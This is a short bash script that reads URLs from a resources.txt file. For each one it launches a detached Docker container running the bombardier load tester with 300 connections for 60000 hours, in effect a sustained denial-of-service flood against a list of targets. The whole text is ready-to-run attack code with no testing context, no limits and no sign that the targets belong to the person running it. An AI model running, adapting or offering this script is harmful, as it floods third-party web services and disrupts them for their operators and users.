IFS=$'\n' read -d '' -r -a lines < resources.txt

for i in "${lines[@]}"
do
   echo "$i"
   export URL=$i
   docker run  -d  alpine/bombardier -c 300 -d 60000h -l $URL 
 done
